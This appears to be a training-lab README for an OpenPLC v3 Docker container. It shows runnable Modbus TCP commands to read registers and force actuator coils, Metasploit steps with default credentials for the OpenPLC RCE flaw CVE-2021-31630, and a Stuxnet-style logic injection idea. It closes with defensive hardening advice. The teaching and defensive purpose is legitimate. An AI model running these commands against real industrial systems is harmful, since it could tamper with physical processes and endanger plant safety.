# OpenPLC v3: Operational Technology (OT), SCADA & Modbus TCP Exploitation

## Overview

OpenPLC is the world's premier open-source Programmable Logic Controller (PLC) suite conforming to the IEC 61131-3 industrial automation standard. Widely utilized across academic research, SANS ICS courses, and critical infrastructure testing testbeds, OpenPLC simulates industrial automation controllers governing physical machinery, water treatment valves, conveyor belts, and power grid switches.

Unlike IT networks where authentication and encryption are standard, legacy **Operational Technology (OT) and Industrial Control System (ICS)** protocols like **Modbus TCP (Port 502)** inherently lack authentication, session verification, and payload integrity. Anyone with network access can read telemetry registers, force actuator coils, inject malicious ladder logic, or exploit web HMI vulnerabilities (such as CVE-2021-31630) for full remote host compromise.

- **Modbus TCP Industrial Interface**: Port `502`
- **Web HMI / Admin Dashboard**: `http://localhost:8123` (Default credentials: `openplc` / `openplc`)
- **Docker Shortcut**: `./lab start openplc-modbus`
- **Container Name**: `cyberlab_realworld_openplc`
- **RAM Footprint**: ~400 MB

---

## Architecture & Industrial Purdue Model

```
+-------------------------------------------------------------+
|              Attacker Machine / SCADA Pentester             |
+-------------------------------------------------------------+
          | (Modbus TCP Port 502)        | (Web Port 8123)
          v                              v
+-------------------------------------------------------------+
|                      OpenPLC v3 Container                   |
|                                                             |
|  [Purdue Level 2: Web HMI & Management Console (Port 8123)] |
|    - IEC 61131-3 Ladder Logic / Structured Text Compiler   |
|    - C Code Generation Engine (/hardware layer)             |
|    - Authenticated RCE Vector (CVE-2021-31630)              |
|                                                             |
|  [Purdue Level 1: OpenPLC Runtime Engine (Port 502)]        |
|    - Discrete Inputs (%IX0.0 - %IX0.7)                      |
|    - Coils / Actuator Relays (%QX0.0 - %QX0.7)              |
|    - Input Registers (%IW0 - %IW100: Analog Sensors)        |
|    - Holding Registers (%QW0 - %QW100: Setpoints/Limits)    |
+-------------------------------------------------------------+
```

---

## Key ICS / OT Attack Scenarios & Exercises

### 1. Modbus TCP Reconnaissance & Register Mapping

The Modbus protocol communicates in plaintext over TCP port 502. Use Nmap scripts or Python `pymodbus` to enumerate the PLC:

```bash
# Discover Modbus device IDs and unit IDs
nmap -sV -Pn -p 502 --script modbus-discover localhost

# Inspect holding registers using python
python3 -c '
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient("127.0.0.1", port=502)
client.connect()
rr = client.read_holding_registers(0, 10, unit=1)
print("Holding Registers:", rr.registers if not rr.isError() else "Error")
client.close()
'
```

### 2. Forcing Actuator Coils & Register Tampering

In industrial environments, modifying registers alters physical behavior (such as opening emergency pressure relief valves or altering chemical dosing ratios):

```bash
# Force Coil 0 to ON (1) - Simulating opening a fluid valve
python3 -c '
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient("127.0.0.1", port=502)
client.connect()
# Function Code 0x05: Write Single Coil
res = client.write_coil(0, True, unit=1)
print("Coil Write Status:", res)
client.close()
'
```

### 3. OpenPLC Web HMI Code Injection RCE (CVE-2021-31630)

- **Vulnerability Mechanism**: The OpenPLC web interface permits administrators to select hardware platforms (`/hardware`). OpenPLC generates a C file (`hardware_layer.cpp`) based on this form and compiles it using `g++` via `system()` without input sanitization.
- **Metasploit Exploitation**:
  ```bash
  msfconsole -q
  use exploit/linux/http/openplc_rce
  set RHOSTS 127.0.0.1
  set RPORT 8123
  set USERNAME openplc
  set PASSWORD openplc
  exploit
  ```
  The exploit uploads a reverse shell embedded directly inside the compiled C hardware driver, yielding an interactive root shell.

### 4. Stuxnet-Style Logic Injection

Upload an IEC 61131-3 Structured Text (ST) program that manipulates internal holding registers while keeping HMI reporting registers fixed, blindfolding operators to physical equipment tampering.

---

## Defensive Remediation & Industrial Hardening

1. **Purdue Model Network Segmentation**:
   Isolate industrial control networks (Purdue Levels 1 & 2) behind dedicated Industrial Firewalls and Demilitarized Zones (IDMZ). Modbus TCP should never be accessible from corporate IT subnets or the internet.
2. **Deep Packet Inspection (DPI) with Suricata & Zeek**:
   Deploy Modbus-aware IDS signatures from `tools/network/suricata` to alert on unexpected Function Code 0x05/0x06 (Write) commands originating from non-engineering workstations.
3. **Transition to Secure Protocols**:
   Migrate from legacy plaintext Modbus to **Modbus Security (Modbus/TCP Security)** or OPC UA with mandatory x.509 certificate authentication and TLS encryption.

---

## Video Walkthroughs & Technical References

- [Build an ICS Cybersecurity Lab: OpenPLC, FUXA & Docker](https://www.youtube.com/watch?v=LIO0TZx3gHM)
- [Modbus Traffic Capture | SCADA Security Tutorial](https://www.youtube.com/watch?v=u1txIPbJkcQ)
- [OpenPLC Project Official Repository](https://github.com/thiagoralves/OpenPLC_v3)
- [CISA ICS-CERT Recommended Practices for Industrial Control Systems](https://www.cisa.gov/resources-tools/resources/ics-cert-defense-depth)
